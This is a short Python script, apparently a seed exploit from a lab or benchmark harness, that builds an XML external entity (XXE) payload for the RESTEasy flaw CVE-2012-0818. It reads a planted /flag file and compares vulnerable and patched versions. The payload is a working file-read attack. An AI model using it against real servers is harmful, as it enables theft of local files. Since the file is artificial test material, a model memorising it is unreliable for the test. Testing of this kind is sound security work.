#!/usr/bin/env python3
"""[GIVEN] CVE-2012-0818 seed exploit for resteasy-jboss-cve-2014-3490 (REAL HTTP).

The classic RESTEasy XXE vector, delivered as an EXTERNAL HTTP request to the real JAX-RS web app:
a POST /app/xml (application/xml) whose body declares an external SYSTEM GENERAL entity pointing at a
local file and references it in element content, so the RESTEasy JAXB provider's parser (pre-fix)
resolves it and reflects the file's bytes into the returned bean value:

    POST /app/xml   Content-Type: application/xml
    <?xml version="1.0"?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag"> ]>
    <foo>&xxe;</foo>

On V0 (resteasy 2.3.0.GA) the JAXB provider unmarshals the stream directly (no
ExternalEntityUnmarshaller), so &xxe; resolves to the planted /flag content and the flag is reflected
into the HTTP response (REACHES). On V1 (3.0.8.Final, CVE-2012-0818 patched) the provider routes
through ExternalEntityUnmarshaller, whose XMLReader sets external-general-entities=false, so &xxe; is
not resolved -> the flag never appears (BLOCKED). The block on V1 is exactly the guard CVE-2012-0818
added. This probe carries NO external DTD -- it is a pure external-GENERAL-entity payload.
"""

# The read-exfil canary file, planted at /flag at container start (see docker-compose.yml).
CANARY_FILE = "file:///flag"


def candidate():
    return {
        "id": "cve-2012-0818-general-entity-xxe",
        "payload": (
            '<?xml version="1.0"?>'
            '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "' + CANARY_FILE + '"> ]>'
            '<foo>&xxe;</foo>'
        ),
    }


if __name__ == "__main__":
    import json
    print(json.dumps(candidate(), indent=2))
